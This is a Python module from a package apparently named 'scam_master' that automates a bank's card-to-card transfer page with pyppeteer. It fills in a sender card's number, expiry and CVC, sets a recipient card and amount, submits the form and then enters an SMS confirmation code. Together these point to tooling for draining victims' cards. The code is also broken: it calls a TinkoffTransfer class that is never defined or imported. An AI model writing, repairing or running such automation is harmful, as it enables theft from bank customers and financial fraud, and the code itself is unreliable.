import asyncio
from pyppeteer.page import Page as PyppPage
from loguru import logger

from scam_master.infrastructure.banks.interface import IBankTransfer
from scam_master.services.models.transactions import Card
from scam_master.services.models.errors import UNKNOWN_TRANSFER_STATUS, BankError


class PsbankTransfer(IBankTransfer):
    @staticmethod
    async def fill_out_transfer_form(page: PyppPage, url: str, sender_card: Card, recipient_card_number: str, amount: int) -> None:
        try:    
            await page.goto(url)

            await page.waitForSelector('iframe[class="card-to-card__iframe"]')
            iframe = await page.querySelector('iframe[class="card-to-card__iframe"]')
            frame = await iframe.contentFrame()
            
            await asyncio.sleep(2)

            await frame.waitForSelector('input[id="cardNumber"]')
            await frame.type('input[id="cardNumber"]', sender_card.card_number)

            await asyncio.sleep(2)

            await frame.type('input[id="month"]', sender_card.expiration_date[:2])

            await asyncio.sleep(2)

            await frame.type('input[id="year"]', sender_card.expiration_date[2:])

            await asyncio.sleep(2)

            await frame.type('input[id="cvc"]', sender_card.cvc)

            await asyncio.sleep(2)

            await frame.type('input[id="cardNumberReciever"]', recipient_card_number)

            await asyncio.sleep(2)

            transfer_amount = f"{int(amount / 100)}"
            await frame.type('input[id="amount"]', transfer_amount)

            await asyncio.sleep(3)

            button = await frame.querySelector('div.button-submit.transfers__submit')

            is_disabled = await frame.evaluate('(element) => element.classList.contains("disabled")', button)

            if is_disabled:
                raise UNKNOWN_TRANSFER_STATUS

            await button.click()
        
        except BankError:
            raise

        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    async def confirm_transfer(page: PyppPage, sms_code: str) -> None:
        try:
            await page.waitForSelector('input[name="password"]')
            await page.type('input[name="password"]', sms_code)
            
            text = await TinkoffTransfer._check_transfer_status(page)
            logger.info(f'Transfer status: {text}')

            if 'Переведено' not in text:
                raise UNKNOWN_TRANSFER_STATUS
        
        except BankError:
            raise

        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS
    
    @staticmethod
    async def _check_transfer_status(page: PyppPage) -> str:
        try:
            await page.waitForXPath('(//*[@data-qa-file="UIAlertError"] | //div[@data-qa-file="PageTitleContainer"])')
            elements = await page.xpath('(//span[@data-qa-file="UIAlertError" and contains(@class, "ui-alert-error__message")] | //div[@data-qa-file="PageTitleContainer"])')
            
            if elements:
                extracted_text = await page.evaluate('(e) => e.innerText', elements[0])
                return extracted_text
        
        except Exception as e:
            logger.exception(e)
            raise UNKNOWN_TRANSFER_STATUS

    @staticmethod
    def _fill_cvc(cvc: str) -> list[str]:
        return [f"//span[@data-value='{char}']" for char in cvc]
